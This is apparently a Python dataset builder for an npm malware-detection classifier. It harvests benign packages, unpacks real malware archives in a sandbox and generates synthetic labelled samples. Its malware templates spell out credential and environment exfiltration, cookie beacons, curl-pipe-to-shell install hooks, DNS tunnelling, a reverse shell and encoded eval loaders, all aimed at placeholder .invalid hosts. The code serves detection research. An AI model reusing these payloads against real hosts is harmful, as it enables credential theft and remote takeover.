"""
PackGuard Stage 2 v6 — Leak-Free Real Dataset & Sandbox Corpus Builder.

Runs ONLY inside the isolated Linux server sandbox (never extract live malware on Windows).

Key scientific integrity guarantees:
  1. Holds out 100% of `data/from-instance/benign` (2,549 pkgs), `known` (11,050 pkgs),
     and `new` (9,085 pkgs) as the untouched final evaluation benchmark.
  2. Records every held-out package name AND normalized code fingerprint, and
     asserts ZERO overlap (by name or fingerprint) with Train or Dev-Val.
  3. Harvests fresh real benign npm packages (including curated hard-benign CLIs,
     git helpers, HTTP clients, Discord/Telegram bots, bundlers, auth/env libs)
     live from registry.npmjs.org, strictly excluding all 2,549 held-out benign names.
  4. Applies real JS obfuscation/encoding transforms (terser, javascript-obfuscator,
     Base64, Hex, CharCode, split-string) symmetrically to BOTH benign and malicious
     training packages so the neural network learns behavior, not obfuscation shortcuts.
  5. Splits Train (88%) vs Dev-Val (12%) strictly by canonical package name + code
     fingerprint, shuffles fully, and balances classes ~50/50.
"""

import argparse
import base64
import concurrent.futures
import gzip
import hashlib
import io
import json
import os
import random
import re
import shutil
import subprocess
import sys
import tarfile
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

V6_DIR = Path(__file__).resolve().parent
if str(V6_DIR) not in sys.path:
    sys.path.insert(0, str(V6_DIR))

from record_builder import (
    CODE_EXTENSIONS,
    SKIP_DIRS,
    SKIP_SUFFIXES,
    build_package_windows,
    compute_code_fingerprint,
    extract_package_json_name,
    normalize_package_name,
    package_dir_to_record,
)

USER_AGENT = "Mozilla/5.0 (compatible; PackGuard-Research-v6/1.0)"
NPM_SEARCH_URL = "https://registry.npmjs.org/-/v1/search?text=%s&size=250&from=%d"
NPM_REGISTRY_URL = "https://registry.npmjs.org/%s"

HARD_BENIGN_PACKAGES = [
    "execa", "cross-spawn", "simple-git", "git-rev-sync", "shelljs", "husky",
    "lint-staged", "rimraf", "chokidar", "nodemon", "concurrently", "npm-run-all",
    "node-gyp", "prebuild-install", "which", "isexe", "open", "opn", "clipboardy",
    "axios", "got", "superagent", "undici", "node-fetch", "ky", "needle", "bent",
    "discord.js", "telegraf", "node-telegram-bot-api", "@slack/web-api", "nodemailer",
    "ws", "socket.io", "socket.io-client", "express", "fastify", "koa", "hapi",
    "form-data", "multiparty", "busboy", "multer", "raw-body", "body-parser",
    "dotenv", "dotenv-expand", "basic-auth", "jsonwebtoken", "bcryptjs", "passport",
    "jose", "oauth", "cookie", "cookie-parser", "express-session", "cors", "helmet",
    "webpack", "esbuild", "rollup", "vite", "parcel", "tsup", "swc", "terser",
    "eslint", "prettier", "jest", "vitest", "mocha", "chai", "sinon", "ava",
    "chalk", "kleur", "picocolors", "ora", "commander", "yargs", "inquirer", "prompts",
    "mime-db", "mime-types", "date-fns", "dayjs", "moment", "luxon", "lodash",
    "ramda", "uuid", "nanoid", "ulid", "semver", "glob", "fast-glob", "globby",
    "fs-extra", "graceful-fs", "mkdirp", "tmp", "temp", "tar", "adm-zip", "jszip",
    "archiver", "unzipper", "yauzl", "yazl", "zlib", "pako", "fflate", "lz-string",
    "winston", "pino", "bunyan", "debug", "morgan", "log4js", "consola",
    "pg", "mysql2", "ioredis", "redis", "mongoose", "mongodb", "sqlite3", "knex",
    "prisma", "drizzle-orm", "sequelize", "typeorm", "ajv", "zod", "joi", "yup",
    "yaml", "js-yaml", "toml", "ini", "csv-parse", "papaparse", "xml2js", "cheerio",
    "marked", "markdown-it", "highlight.js", "prismjs", "handlebars", "ejs", "pug",
    "react", "react-dom", "vue", "svelte", "preact", "redux", "zustand", "immer",
    "rxjs", "async", "p-limit", "p-queue", "p-retry", "bottleneck", "bullmq",
    "cron", "node-cron", "node-schedule", "chokidar", "watchpack", "http-proxy",
    "http-proxy-middleware", "serve-static", "compression", "etag", "fresh", "send",
    "ssh2", "node-ssh", "ftp", "basic-ftp", "dns-packet", "ip", "ipaddr.js", "cidr-tools",
    "crypto-js", "node-forge", "tweetnacl", "libsodium-wrappers", "argon2", "scrypt-js",
    "aws-sdk", "@aws-sdk/client-s3", "googleapis", "octokit", "@octokit/rest",
    "stripe", "twilio", "sendgrid", "@sentry/node", "posthog-node", "mixpanel",
    "puppeteer-core", "playwright-core", "jsdom", "happy-dom", "linkedom",
    "sharp", "jimp", "canvas", "pdf-lib", "pdfkit", "exceljs", "xlsx",
    "typescript", "ts-node", "tsx", "nodemon", "pm2", "forever", "cross-env",
    "env-cmd", "cosmiconfig", "convict", "nconf", "config", "rc", "minimist",
    "meow", "cac", "citty", "oclif", "vorpal", "enquirer", "boxen", "figlet",
    "cli-table3", "cli-progress", "listr2", "exec-sh", "spawn-rx", "tree-kill",
    "ps-list", "find-process", "systeminformation", "os-name", "default-gateway",
    "public-ip", "internal-ip", "get-port", "portfinder", "detect-port",
    "update-notifier", "latest-version", "package-json", "read-pkg-up", "pkg-dir",
    "resolve", "enhanced-resolve", "require-from-string", "import-fresh", "decache",
    "vm2", "isolated-vm", "acorn", "esprima", "recast", "jscodeshift", "@babel/parser",
    "ethers", "web3", "viem", "@solana/web3.js", "@solana/spl-token", "bs58", "bip39",
    "hdkey", "secp256k1", "elliptic", "bn.js", "keccak", "ethereumjs-util", "tronweb",
    "plotly.js-dist", "d3", "three", "chart.js", "echarts", "highcharts",
    "@nestjs/common", "@nestjs/core", "@nestjs/cli", "nuxt", "next", "gatsby",
    "swagger-ui-express", "swagger-jsdoc", "openapi-types", "graphql", "apollo-server",
    "tsyringe", "inversify", "reflect-metadata", "class-validator", "class-transformer",
    "cspell", "stryker", "storybook", "cypress", "playwright", "react-native",
]

SEARCH_KEYWORDS = [
    "cli", "child_process", "git", "exec", "spawn", "shell", "build", "bundler",
    "http", "fetch", "axios", "request", "webhook", "discord", "telegram", "slack",
    "bot", "api", "proxy", "socket", "websocket", "server", "express", "middleware",
    "auth", "jwt", "oauth", "cookie", "session", "crypto", "encrypt", "hash", "env",
    "dotenv", "config", "logger", "telemetry", "analytics", "monitor", "metrics",
    "fs", "file", "stream", "archive", "zip", "tar", "compress", "base64", "hex",
    "parser", "json", "yaml", "xml", "csv", "markdown", "template", "html", "svg",
    "react", "vue", "svelte", "component", "form", "date", "time", "timezone",
    "currency", "format", "validator", "schema", "database", "sql", "redis", "mongo",
    "test", "mock", "lint", "eslint", "prettier", "webpack", "rollup", "vite", "plugin",
    "util", "helper", "string", "array", "math", "color", "slug", "uuid", "cache",
    "queue", "retry", "cron", "schedule", "email", "mail", "ssh", "dns", "network",
    "solana", "ethereum", "web3", "wallet", "blockchain", "sms", "graphql", "swagger",
    "nestjs", "nuxt", "unicode", "calendar", "animation", "geometry", "password",
]


def _http_get(url: str, timeout: int = 25, max_bytes: int = 4 * 1024 * 1024) -> Optional[bytes]:
    req = urllib.request.Request(
        url,
        headers={"User-Agent": USER_AGENT, "Accept-Encoding": "gzip"},
    )
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = resp.read(max_bytes + 1)
                if len(data) > max_bytes:
                    return None
                if resp.headers.get("Content-Encoding") == "gzip":
                    data = gzip.decompress(data)
                return data
        except urllib.error.HTTPError as e:
            if e.code in (400, 401, 403, 404, 410, 451):
                return None
            time.sleep(1.5 * (attempt + 1))
        except Exception:
            time.sleep(1.0 * (attempt + 1))
    return None


def extract_zip_folder(zip_dir: Path, out_dir: Path, password: bytes = b"infected") -> int:
    """Extracts all encrypted/plain .zip files in zip_dir into out_dir (Linux sandbox only)."""
    out_dir.mkdir(parents=True, exist_ok=True)
    zips = sorted(zip_dir.glob("*.zip"))
    extracted = 0
    for zp in zips:
        with zipfile.ZipFile(zp, "r") as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                rel = Path(info.filename)
                if rel.is_absolute() or ".." in rel.parts:
                    continue
                target = out_dir / rel
                if target.exists():
                    continue
                target.parent.mkdir(parents=True, exist_ok=True)
                try:
                    data = zf.read(info, pwd=password)
                except RuntimeError:
                    data = zf.read(info)
                target.write_bytes(data)
                extracted += 1
    return extracted


def discover_package_dirs(root: Path, depth_hint: str = "flat") -> List[Tuple[str, Path]]:
    """
    Discovers extracted package directories under root.
    Returns [(category_or_prefix, pkg_dir), ...].
    """
    results: List[Tuple[str, Path]] = []
    if not root.is_dir():
        return results

    if depth_hint == "flat":
        for entry in sorted(root.iterdir()):
            if entry.is_dir():
                results.append(("flat", entry))
        return results

    # Nested layouts: <category>/<pkg> or <shape_id>/<pkg>
    for d1 in sorted(root.iterdir()):
        if not d1.is_dir():
            continue
        has_direct_code = any(
            p.is_file() and (p.name in ("package.json", "install_scripts.txt") or p.suffix.lower() in CODE_EXTENSIONS)
            for p in d1.iterdir()
        )
        if has_direct_code:
            results.append((d1.name, d1))
            continue
        for d2 in sorted(d1.iterdir()):
            if not d2.is_dir():
                continue
            has_code2 = any(
                p.is_file() and (p.name in ("package.json", "install_scripts.txt") or p.suffix.lower() in CODE_EXTENSIONS)
                for p in d2.iterdir()
            )
            if has_code2:
                results.append((d1.name, d2))
                continue
            for d3 in sorted(d2.iterdir()):
                if d3.is_dir():
                    results.append((f"{d1.name}/{d2.name}", d3))
    return results


def _download_single_npm_package(
    pkg_name: str,
    dest_root: Path,
    tarball_url: Optional[str] = None,
) -> Optional[Path]:
    safe_dir = pkg_name.replace("/", "__")
    out_dir = dest_root / safe_dir
    if out_dir.is_dir() and any(out_dir.iterdir()):
        return out_dir

    if not tarball_url:
        meta_bytes = _http_get(NPM_REGISTRY_URL % urllib.parse.quote(pkg_name, safe=""))
        if not meta_bytes:
            return None
        try:
            meta = json.loads(meta_bytes.decode("utf-8", errors="replace"))
            latest = meta.get("dist-tags", {}).get("latest")
            ver_obj = meta.get("versions", {}).get(latest, {}) if latest else {}
            tarball_url = ver_obj.get("dist", {}).get("tarball")
        except Exception:
            return None
    if not tarball_url:
        return None

    tgz_bytes = _http_get(tarball_url, timeout=25, max_bytes=5 * 1024 * 1024)
    if not tgz_bytes:
        return None

    out_dir.mkdir(parents=True, exist_ok=True)
    kept = 0
    try:
        with tarfile.open(fileobj=io.BytesIO(tgz_bytes), mode="r:gz") as tar:
            for member in tar.getmembers():
                if not member.isfile() or member.size == 0 or member.size > 200_000:
                    continue
                rel = member.name.lstrip("./")
                if rel.startswith("package/"):
                    rel = rel[len("package/") :]
                if not rel or ".." in rel.split("/"):
                    continue
                parts = rel.split("/")
                if any(p in SKIP_DIRS for p in parts[:-1]):
                    continue
                low = rel.lower()
                if low != "package.json":
                    if low.endswith(SKIP_SUFFIXES):
                        continue
                    if Path(low).suffix not in CODE_EXTENSIONS:
                        continue
                fh = tar.extractfile(member)
                if fh is None:
                    continue
                raw = fh.read(65536)
                if b"\x00" in raw[:512]:
                    continue
                target = out_dir / rel
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(raw)
                kept += 1
                if kept >= 24:
                    break
    except Exception:
        shutil.rmtree(out_dir, ignore_errors=True)
        return None

    if kept == 0:
        shutil.rmtree(out_dir, ignore_errors=True)
        return None
    return out_dir


def harvest_fresh_benign_npm(
    out_dir: Path,
    forbidden_names: Set[str],
    target_count: int = 4500,
    workers: int = 32,
) -> List[Path]:
    """
    Harvests fresh real benign npm packages (curated hard-benign + diverse search)
    strictly excluding all package names in forbidden_names.
    """
    out_dir.mkdir(parents=True, exist_ok=True)
    existing = [
        p for p in sorted(out_dir.iterdir())
        if p.is_dir() and normalize_package_name(p.name) not in forbidden_names and any(p.iterdir())
    ]
    if len(existing) >= int(target_count * 0.90):
        print(f"[Harvest] Reusing {len(existing)} already-downloaded leak-free benign npm packages in {out_dir}.")
        return existing[:target_count]

    candidate_names: List[str] = []
    seen: Set[str] = set()

    def add_name(name: str) -> None:
        norm = normalize_package_name(name)
        if not norm or norm in forbidden_names or norm in seen:
            return
        seen.add(norm)
        candidate_names.append(name.strip())

    for pkg in HARD_BENIGN_PACKAGES:
        add_name(pkg)

    print(f"[Harvest] Querying npm registry across {len(SEARCH_KEYWORDS)} keyword categories...")
    rng = random.Random(42)
    kw_list = list(SEARCH_KEYWORDS)
    rng.shuffle(kw_list)

    def _search_kw(kw: str) -> List[str]:
        found: List[str] = []
        for offset in (0, 250):
            body = _http_get(NPM_SEARCH_URL % (urllib.parse.quote(kw), offset), timeout=20)
            if not body:
                break
            try:
                obj = json.loads(body.decode("utf-8", errors="replace"))
                for item in obj.get("objects", []):
                    pkg = item.get("package", {})
                    n = pkg.get("name")
                    if isinstance(n, str) and n:
                        found.append(n)
            except Exception:
                break
        return found

    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        for names in ex.map(_search_kw, kw_list):
            for n in names:
                add_name(n)
                if len(candidate_names) >= int(target_count * 1.45):
                    break
            if len(candidate_names) >= int(target_count * 1.45):
                break

    print(f"[Harvest] Collected {len(candidate_names)} leak-free benign candidates (target={target_count}). Downloading...")
    downloaded: List[Path] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(_download_single_npm_package, name, out_dir) for name in candidate_names]
        for idx, fut in enumerate(concurrent.futures.as_completed(futures), 1):
            p = fut.result()
            if p is not None:
                downloaded.append(p)
            if len(downloaded) >= target_count:
                for f in futures:
                    f.cancel()
                break
            if idx % 500 == 0:
                print(f"  [Harvest] Progress: checked={idx}, downloaded={len(downloaded)}/{target_count}", flush=True)

    print(f"[Harvest] Finished downloading {len(downloaded)} fresh real benign npm packages.")
    return downloaded


def _transform_base64_eval(code: str) -> str:
    b64 = base64.b64encode(code[:4096].encode("utf-8", errors="ignore")).decode("ascii")
    return f"const _p = Buffer.from('{b64}', 'base64').toString('utf8');\neval(_p);\n"


def _transform_hex_loader(code: str) -> str:
    hx = code[:3072].encode("utf-8", errors="ignore").hex()
    return f"const _h = Buffer.from('{hx}', 'hex').toString('utf8');\n(new Function(_h))();\n"


def _transform_charcode_wrap(code: str) -> str:
    sample = code[:1500]
    nums = ",".join(str(ord(c)) for c in sample if ord(c) < 128)
    return f"const _s = String.fromCharCode({nums});\nFunction('require', 'process', _s)(require, process);\n"


def _transform_split_strings(code: str, rng: random.Random) -> str:
    def _split_lit(m: re.Match) -> str:
        s = m.group(2)
        if len(s) < 6 or "\\" in s:
            return m.group(0)
        k = rng.randint(2, len(s) - 2)
        q = m.group(1)
        return f"({q}{s[:k]}{q}+{q}{s[k:]}{q})"

    return re.sub(r"""(['"])([A-Za-z0-9_./:-]{6,40})\1""", _split_lit, code, count=12)


def _transform_terser(code: str, terser_bin: Optional[str]) -> Optional[str]:
    if not terser_bin or len(code) < 60:
        return None
    try:
        proc = subprocess.run(
            [terser_bin, "--compress", "--mangle"],
            input=code[:24000].encode("utf-8", errors="ignore"),
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            timeout=5,
        )
        if proc.returncode == 0 and proc.stdout.strip():
            return proc.stdout.decode("utf-8", errors="replace")
    except Exception:
        return None
    return None


def _transform_js_obfuscator(code: str, obf_bin: Optional[str]) -> Optional[str]:
    if not obf_bin or len(code) < 60 or len(code) > 12000:
        return None
    tmp_in = Path(f"/tmp/pg_obf_in_{os.getpid()}_{random.randint(1000,999999)}.js")
    tmp_out = Path(f"/tmp/pg_obf_out_{os.getpid()}_{random.randint(1000,999999)}.js")
    try:
        tmp_in.write_text(code, encoding="utf-8", errors="ignore")
        proc = subprocess.run(
            [
                obf_bin,
                str(tmp_in),
                "--output",
                str(tmp_out),
                "--compact",
                "true",
                "--string-array",
                "true",
                "--string-array-encoding",
                "base64",
                "--rotate-string-array",
                "true",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=8,
        )
        if proc.returncode == 0 and tmp_out.is_file():
            out = tmp_out.read_text(encoding="utf-8", errors="replace")
            if out.strip():
                return out
    except Exception:
        return None
    finally:
        tmp_in.unlink(missing_ok=True)
        tmp_out.unlink(missing_ok=True)
    return None


def generate_paired_boundary_samples(rng: random.Random, count_per_class: int = 1200) -> List[Dict[str, Any]]:
    """
    Generates balanced 50/50 paired hard-boundary training examples addressing every
    real-world false alarm and missed attack vector documented in STAGE2_V3/V5_FLAWS.md.
    Uses ONLY synthetic/inert templates with .invalid domains — zero benchmark packages.
    """
    benign_templates = [
        # Git / CLI helpers using child_process (benign!)
        lambda i: (
            "index.js",
            f"const {{ execSync }} = require('child_process');\n"
            f"function getCommitHash_{i}() {{ return execSync('git rev-parse --short HEAD', {{ encoding: 'utf8' }}).trim(); }}\n"
            f"function getBranch_{i}() {{ return execSync('git rev-parse --abbrev-ref HEAD', {{ encoding: 'utf8' }}).trim(); }}\n"
            f"module.exports = {{ getCommitHash: getCommitHash_{i}, getBranch: getBranch_{i} }};\n",
        ),
        lambda i: (
            "cli.js",
            f"const {{ spawnSync }} = require('child_process');\n"
            f"const path = require('path');\n"
            f"function runLinter_{i}(dir) {{\n"
            f"  const res = spawnSync('npx', ['eslint', '--fix', path.resolve(dir)], {{ stdio: 'inherit' }});\n"
            f"  return res.status === 0;\n"
            f"}}\nmodule.exports = runLinter_{i};\n",
        ),
        # Benign URLs with .me/.is/.pro/.to/.cn/.ru and while(true) loops
        lambda i: (
            "parser.js",
            f"const DOC_URL = 'https://docs.tooling{i}.me/reference';\n"
            f"const MIRROR = 'https://cdn.example{i}.pro/assets';\n"
            f"function scanStream_{i}(iter) {{\n"
            f"  const out = [];\n"
            f"  while (true) {{\n"
            f"    const step = iter.next();\n"
            f"    if (step.done) break;\n"
            f"    out.push(step.value);\n"
            f"  }}\n"
            f"  return out;\n"
            f"}}\nmodule.exports = {{ DOC_URL, MIRROR, scanStream: scanStream_{i} }};\n",
        ),
        # Benign Discord / Telegram / Slack bot SDK wrapper
        lambda i: (
            "bot.js",
            f"const axios = require('axios');\n"
            f"class BotClient_{i} {{\n"
            f"  constructor(token) {{ this.token = token || process.env.BOT_TOKEN; }}\n"
            f"  async sendMessage(chatId, text) {{\n"
            f"    return axios.post('https://api.telegram.org/bot' + this.token + '/sendMessage', {{ chat_id: chatId, text }});\n"
            f"  }}\n"
            f"}}\nmodule.exports = BotClient_{i};\n",
        ),
        # Benign browser analytics / DOM helper (no cookie/credential exfil)
        lambda i: (
            "metrics.js",
            f"export function trackPageView_{i}(endpoint, route) {{\n"
            f"  if (typeof navigator !== 'undefined' && navigator.sendBeacon) {{\n"
            f"    navigator.sendBeacon(endpoint, JSON.stringify({{ event: 'pageview', route, ts: Date.now() }}));\n"
            f"  }}\n"
            f"}}\n",
        ),
        # Benign Base64 data / SVG icon decoder
        lambda i: (
            "icon.js",
            "const SVG_B64 = '"
            + base64.b64encode(
                ("<svg width='" + str(16 + (i % 48)) + "' height='24'><circle cx='12' cy='12' r='10'/></svg>").encode()
            ).decode()
            + "';\nexports.getIconSvg = () => Buffer.from(SVG_B64, 'base64').toString('utf8');\n",
        ),
        # Benign dotenv / config / env loader
        lambda i: (
            "config.js",
            f"const fs = require('fs');\n"
            f"const path = require('path');\n"
            f"function loadConfig_{i}(cwd = process.cwd()) {{\n"
            f"  const p = path.join(cwd, '.env');\n"
            f"  if (!fs.existsSync(p)) return {{ port: process.env.PORT || {3000 + (i % 500)} }};\n"
            f"  const lines = fs.readFileSync(p, 'utf8').split(/\\r?\\n/);\n"
            f"  const cfg = {{}};\n"
            f"  for (const line of lines) {{ const [k, ...v] = line.split('='); if (k) cfg[k.trim()] = v.join('=').trim(); }}\n"
            f"  return cfg;\n"
            f"}}\nmodule.exports = loadConfig_{i};\n",
        ),
        # Benign install hook (husky / tsc / node-gyp)
        lambda i: (
            "install_scripts.txt",
            rng.choice([
                "prepare: husky install || true",
                "postinstall: tsc -p tsconfig.json",
                "install: node-gyp rebuild",
                "prepublishOnly: npm run build && npm test",
                "postinstall: node scripts/check-node-version.js",
            ]),
        ),
    ]

    malware_templates = [
        # 1. Encoded loader (Base64 / Hex / CharCode -> eval / Function / child_process)
        lambda i: (
            "index.js",
            _transform_base64_eval(
                f"const cp = require('child_process');\n"
                f"const os = require('os');\n"
                f"const d = Buffer.from(JSON.stringify({{u: os.userInfo().username, h: os.hostname(), e: process.env}})).toString('base64');\n"
                f"cp.exec('curl -s -X POST -d \"' + d + '\" https://drop{i}.invalid/collect');\n"
            ),
        ),
        lambda i: (
            "loader.js",
            _transform_hex_loader(
                f"const https = require('https');\n"
                f"const fs = require('fs');\n"
                f"const k = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');\n"
                f"const r = https.request('https://exfil{i}.invalid/npm', {{method:'POST'}}); r.end(k);\n"
            ),
        ),
        # 2. Browser stream_clone / cookie & localStorage beacon
        lambda i: (
            "index.js",
            f"(function(){{\n"
            f"  if (typeof document === 'undefined') return;\n"
            f"  const payload = btoa(JSON.stringify({{ c: document.cookie, s: Object.assign({{}}, localStorage), h: location.href }}));\n"
            f"  new Image().src = 'https://beacon{i}.invalid/p.gif?q=' + encodeURIComponent(payload);\n"
            f"  if (navigator.sendBeacon) navigator.sendBeacon('https://beacon{i}.invalid/s', payload);\n"
            f"}})();\n",
        ),
        # 3. Credential harvester (~/.ssh, ~/.aws, .npmrc, wallet files)
        lambda i: (
            "index.js",
            f"const fs = require('fs'), os = require('os'), path = require('path'), https = require('https');\n"
            f"const home = os.homedir();\n"
            f"const targets = ['.aws/credentials', '.ssh/id_rsa', '.npmrc', '.env', '.gitconfig'];\n"
            f"const stolen = {{}};\n"
            f"for (const t of targets) {{ try {{ stolen[t] = fs.readFileSync(path.join(home, t), 'utf8'); }} catch (_) {{}} }}\n"
            f"const req = https.request('https://vault{i}.invalid/u', {{ method: 'POST', headers: {{ 'Content-Type': 'application/json' }} }});\n"
            f"req.end(JSON.stringify({{ env: process.env, files: stolen }}));\n",
        ),
        # 4. Disguised install hook with benign dev words (prettier / eslint / husky)
        lambda i: (
            "install_scripts.txt",
            f"postinstall: curl -sSf https://stage{i}.invalid/init.sh | sh; echo prettier",
        ),
        lambda i: (
            "install_scripts.txt",
            f"preinstall: wget -qO- http://cdn{i}.invalid/r.sh | bash && echo eslint done",
        ),
        # 5. Split-string module.constructor._load evasion
        lambda i: (
            "index.js",
            f"const m = module.constructor._load('chi' + 'ld_' + 'pro' + 'cess');\n"
            f"const fn = 'ex' + 'ec' + 'Sync';\n"
            f"m[fn]('bash -c \"curl -s -d \\'$(id; env)\\' https://c2-{i}.invalid/r\"');\n",
        ),
        # 6. DNS beacon / reverse shell / wallet stealer
        lambda i: (
            "index.js",
            f"const dns = require('dns'), os = require('os');\n"
            f"const hex = Buffer.from(os.hostname() + ':' + (process.env.NPM_TOKEN || os.userInfo().username)).toString('hex');\n"
            f"for (let j = 0; j < hex.length; j += 48) {{ dns.resolve(hex.slice(j, j+48) + '.d{i}.invalid', () => {{}}); }}\n",
        ),
        lambda i: (
            "index.js",
            f"const net = require('net'), cp = require('child_process');\n"
            f"const sh = cp.spawn('/bin/sh', []);\n"
            f"const sock = new net.Socket();\n"
            f"sock.connect({4000 + (i % 1000)}, 'rev{i}.invalid', () => {{ sock.pipe(sh.stdin); sh.stdout.pipe(sock); sh.stderr.pipe(sock); }});\n",
        ),
        # 7. CharCode eval_decode
        lambda i: (
            "index.js",
            _transform_charcode_wrap(
                f"require('child_process').exec('curl -s https://cc{i}.invalid/a | sh');"
            ),
        ),
    ]

    records: List[Dict[str, Any]] = []
    for i in range(count_per_class):
        fname_b, code_b = benign_templates[i % len(benign_templates)](i)
        kind_b = "install_script" if fname_b == "install_scripts.txt" else "js"
        rec_b = {"package": f"synth_benign_{i}", "chunks": [{"file": fname_b, "kind": kind_b, "start": 0, "text": code_b}]}
        wins_b = build_package_windows(rec_b, max_windows=4)
        for w in wins_b:
            records.append({"package": rec_b["package"], "text": w, "label": 0, "source": "synth_hard_benign"})

        fname_m, code_m = malware_templates[i % len(malware_templates)](i)
        kind_m = "install_script" if fname_m == "install_scripts.txt" else "js"
        rec_m = {"package": f"synth_malware_{i}", "chunks": [{"file": fname_m, "kind": kind_m, "start": 0, "text": code_m}]}
        wins_m = build_package_windows(rec_m, max_windows=4)
        for w in wins_m:
            records.append({"package": rec_m["package"], "text": w, "label": 1, "source": "synth_hard_malware"})

    return records


def _extract_pkg_record_task(args: Tuple[str, Path, int, str]) -> Optional[Dict[str, Any]]:
    cat, pdir, label, source = args
    rec = package_dir_to_record(pdir)
    if not rec.get("chunks"):
        return None
    wins = build_package_windows(rec, max_windows=10)
    if not wins:
        return None
    pj_name = extract_package_json_name(pdir)
    all_names = {normalize_package_name(pdir.name)}
    if pj_name:
        all_names.add(normalize_package_name(pj_name))
        all_names.add(pj_name.lower().strip())
    return {
        "package": pdir.name,
        "norm_name": normalize_package_name(pj_name or pdir.name),
        "all_names": sorted(all_names),
        "fingerprint": compute_code_fingerprint(rec),
        "category": cat,
        "label": label,
        "source": source,
        "windows": wins,
        "chunks": rec["chunks"],
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="Build leak-free Stage 2 v6 real training & sandbox datasets.")
    parser.add_argument("--repo-dir", default="/home/USER/PackGuard", help="Path to PackGuard repository on Linux server.")
    parser.add_argument("--work-dir", default="/home/USER/v6_sandbox", help="Isolated Linux working directory.")
    parser.add_argument("--benign-target", type=int, default=4500, help="Fresh real benign npm packages to harvest.")
    parser.add_argument("--max-train-windows-per-pkg", type=int, default=4, help="Max windows per package in train set.")
    parser.add_argument("--workers", type=int, default=min(32, os.cpu_count() or 8), help="CPU worker count.")
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    rng = random.Random(args.seed)
    repo = Path(args.repo_dir).resolve()
    work = Path(args.work_dir).resolve()
    work.mkdir(parents=True, exist_ok=True)

    # 1. Extract held-out sandbox sets (from-instance) & raw training malware corpora
    heldout_root = work / "heldout"
    train_raw_root = work / "train_raw"

    print("[Step 1] Extracting encrypted archives inside Linux sandbox...")
    extract_zip_folder(repo / "data/from-instance/benign", heldout_root / "benign")
    extract_zip_folder(repo / "data/from-instance/known", heldout_root / "known")
    extract_zip_folder(repo / "data/from-instance/new", heldout_root / "new")
    extract_zip_folder(repo / "data/from-instance/combined", train_raw_root / "combined")
    extract_zip_folder(repo / "data/v2", train_raw_root / "v2")
    extract_zip_folder(repo / "data/v1", train_raw_root / "v1")

    # 2. Index ALL held-out names & code fingerprints (ZERO LEAKAGE GUARD)
    print("[Step 2] Indexing held-out sandbox sets for strict zero-leakage guard...")
    heldout_ben_dirs = discover_package_dirs(heldout_root / "benign", "flat")
    heldout_known_dirs = discover_package_dirs(heldout_root / "known", "flat")
    heldout_new_dirs = discover_package_dirs(heldout_root / "new", "flat")
    print(
        f"  Held-out counts: benign={len(heldout_ben_dirs)}, "
        f"known={len(heldout_known_dirs)}, new={len(heldout_new_dirs)}"
    )

    forbidden_names: Set[str] = set()
    forbidden_fps: Set[str] = set()

    for _, pdir in heldout_ben_dirs + heldout_known_dirs + heldout_new_dirs:
        forbidden_names.add(normalize_package_name(pdir.name))

    # Fingerprint held-out packages in parallel (sample + all benign + all real malware)
    fp_tasks = [(c, p, 0, "heldout") for c, p in heldout_ben_dirs + heldout_known_dirs + heldout_new_dirs]
    with concurrent.futures.ProcessPoolExecutor(max_workers=args.workers) as ex:
        for res in ex.map(_extract_pkg_record_task, fp_tasks, chunksize=32):
            if res is not None:
                for nm in res["all_names"]:
                    forbidden_names.add(nm)
                forbidden_fps.add(res["fingerprint"])

    print(f"  Leakage guard armed: {len(forbidden_names)} forbidden package names, {len(forbidden_fps)} forbidden code fingerprints.")

    # 3. Harvest fresh real benign npm packages strictly excluding heldout benign
    benign_harvest_dir = train_raw_root / "fresh_benign_npm"
    benign_dirs = harvest_fresh_benign_npm(
        out_dir=benign_harvest_dir,
        forbidden_names=forbidden_names,
        target_count=args.benign_target,
        workers=32,
    )

    # 4. Collect leak-free real malware packages from combined (flat) + v2 (nested) + v1 (nested)
    print("[Step 4] Collecting leak-free real malware packages...")
    mal_candidates = (
        discover_package_dirs(train_raw_root / "combined", "flat")
        + discover_package_dirs(train_raw_root / "v2", "nested")
        + discover_package_dirs(train_raw_root / "v1", "nested")
    )

    ben_tasks = [("npm_benign", p, 0, "real_npm_benign") for p in benign_dirs]
    mal_tasks = [(c, p, 1, "real_datadog_malware") for c, p in mal_candidates]

    ben_pkgs: List[Dict[str, Any]] = []
    mal_pkgs: List[Dict[str, Any]] = []
    seen_train_names: Set[str] = set()
    seen_train_fps: Set[str] = set()

    with concurrent.futures.ProcessPoolExecutor(max_workers=args.workers) as ex:
        for res in ex.map(_extract_pkg_record_task, ben_tasks, chunksize=16):
            if res is None:
                continue
            if any(nm in forbidden_names for nm in res["all_names"]) or res["fingerprint"] in forbidden_fps:
                continue
            if any(nm in seen_train_names for nm in res["all_names"]) or res["fingerprint"] in seen_train_fps:
                continue
            for nm in res["all_names"]:
                seen_train_names.add(nm)
            seen_train_fps.add(res["fingerprint"])
            ben_pkgs.append(res)

        for res in ex.map(_extract_pkg_record_task, mal_tasks, chunksize=32):
            if res is None:
                continue
            if any(nm in forbidden_names for nm in res["all_names"]) or res["fingerprint"] in forbidden_fps:
                continue
            if any(nm in seen_train_names for nm in res["all_names"]) or res["fingerprint"] in seen_train_fps:
                continue
            for nm in res["all_names"]:
                seen_train_names.add(nm)
            seen_train_fps.add(res["fingerprint"])
            mal_pkgs.append(res)

    print(f"  Leak-free unique real packages ready: benign={len(ben_pkgs)}, malware={len(mal_pkgs)}")
    if len(ben_pkgs) < 1000 or len(mal_pkgs) < 1000:
        raise RuntimeError(f"Insufficient leak-free real packages: benign={len(ben_pkgs)}, malware={len(mal_pkgs)}")

    # 5. Strict package/fingerprint disjoint Train (88%) vs Dev-Val (12%) split
    rng.shuffle(ben_pkgs)
    rng.shuffle(mal_pkgs)

